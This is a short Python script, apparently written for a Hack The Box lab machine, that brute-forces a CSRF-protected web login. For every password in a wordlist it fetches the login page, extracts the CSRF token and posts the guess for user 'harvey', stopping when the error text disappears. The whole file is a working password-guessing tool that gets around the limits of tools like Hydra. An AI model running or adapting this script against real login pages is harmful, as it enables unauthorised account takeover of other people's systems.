# If a site has CSRF Hydra fails to brute force it so just a dirty script to do it manually.

import requests
from bs4 import BeautifulSoup


url = 'http://monitor.bart.htb/index.php'
session = requests.Session()

with open('wordlist.txt') as wordlist:
	password = wordlist.readline().strip()
	while password:
		response = session.get(url)
		if(response.ok):
			soup = BeautifulSoup(response.text, 'html.parser')
			csrf = soup.find('input', {"name": "csrf"})['value']
			form_data = {'csrf': csrf, 'user_name': 'harvey', 'user_password': password, 'action': 'login'}
			response = session.post(url, data=form_data)
			if(response.ok):
				if('The information is incorrect.' in response.text):
					print(f"{password} is not right bro...")
				else:
					print(f"WOOT WOOT --> {password}")
					break
		password = wordlist.readline().strip()
